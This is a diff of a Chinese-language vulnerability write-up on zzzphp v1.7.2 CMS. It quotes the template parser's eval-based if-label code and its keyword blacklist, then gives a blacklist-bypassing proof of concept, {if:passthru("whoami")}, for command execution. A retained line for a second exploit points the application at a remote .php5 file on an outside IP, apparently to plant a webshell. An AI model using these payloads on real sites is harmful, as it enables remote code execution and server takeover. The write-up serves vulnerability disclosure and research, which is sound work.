@@ -1,4 +1,78 @@
-## zzzphp v1.7.2 Code excute
+## zzzphp v1.7.2 Code excute 1
+
+捡洞，原文来源于https://xz.aliyun.com/t/4471
+
+原文版本为1.6.1，当前版本1.7.2在换了个poc之后依旧可以造成命令执行。
+
+在inc/zzz_template.php第2343到2492行
+
+```php
+function parserIfLabel( $zcontent ) {
+	$pattern = '/\{if:([\s\S]+?)}([\s\S]*?){end\s+if}/';
+	if ( preg_match_all( $pattern, $zcontent, $matches ) ) {
+		$count = count( $matches[ 0 ] );
+		var_dump($count);
+		for ( $i = 0; $i < $count; $i++ ) {
+			$flag = '';
+			$out_html = '';
+			$ifstr = $matches[ 1 ][ $i ];
+			// 危险关键字过滤
+			$ifstr=danger_key($ifstr);
+			$ifstr = str_replace( '=', '==', $ifstr );
+			$ifstr = str_replace( '<>', '!=', $ifstr );
+			$ifstr = str_replace( 'or', '||', $ifstr );
+			$ifstr = str_replace( 'and', '&&', $ifstr );
+			$ifstr = str_replace( 'mod', '%', $ifstr );
+			//echop( $ifstr);
+			@eval( 'if(' . $ifstr . '){$flag="if";}else{$flag="else";}' );
+			if ( preg_match( '/([\s\S]*)?\{else\}([\s\S]*)?/', $matches[ 2 ][ $i ], $matches2 ) ) { // 判断是否存在else
+				switch ( $flag ) {
+					case 'if': // 条件为真
+						if ( isset( $matches2[ 1 ] ) ) {
+							$out_html .= $matches2[ 1 ];
+						}
+						break;
+					case 'else': // 条件为假
+						if ( isset( $matches2[ 2 ] ) ) {
+							$out_html .= $matches2[ 2 ];
+						}
+						break;
+				}
+			} elseif ( $flag == 'if' ) {
+				$out_html .= $matches[ 2 ][ $i ];
+			}
+			// 无限极嵌套解析
+			$pattern2 = '/\{if([0-9]):/';
+			if ( preg_match( $pattern2, $out_html, $matches3 ) ) {
+				$out_html = str_replace( '{if' . $matches3[ 1 ], '{if', $out_html );
+				$out_html = str_replace( '{else' . $matches3[ 1 ] . '}', '{else}', $out_html );
+				$out_html = str_replace( '{end if' . $matches3[ 1 ] . '}', '{end if}', $out_html );
+				$out_html = $this->parserIfLabel( $out_html );
+			}
+			// 执行替换
+			$zcontent = str_replace( $matches[ 0 ][ $i ], $out_html, $zcontent );
+		}
+	}
+	return $zcontent;
+}
+```
+
+主要是去解析模板文件里的if语句，模板文件中是{if:a}{end:if}形式，需要解析为php语法。第2362行使用了eval函数，拼凑参数$ifstr，$ifstr是{if:a}里的a，同时$ifstr进行了黑名单替换，替换的关键字如下：
+
+```php
+$danger=array('php','preg','server','chr','decode','html','md5','post','get','cookie','session','sql','del','encrypt','upload','db','$','system','exec','shell','popen','eval');
+$s = str_ireplace($danger,"*",$s);
+```
+
+POC使用`{if:passthru("whoami")}hacked{end if}`即可绕过检测，修改html和先知文章一样，最终利用：
+
+![](https://s2.ax1x.com/2019/09/04/nVgB0s.png)
+
+![](https://s2.ax1x.com/2019/09/04/nVgU1S.png)
+
+![](https://s2.ax1x.com/2019/09/04/nVga6g.png)
+
+## zzzphp v1.7.2 Code excute 2
 
 inc/zzz_file.php
 
@@ -120,5 +194,5 @@ source[]=http://45.78.50.117:8000/s.php5
 
 A gif:
 
-https://s2.ax1x.com/2019/09/05/nmi8Ug.gif
+![](https://s2.ax1x.com/2019/09/05/nmi8Ug.gif)
 
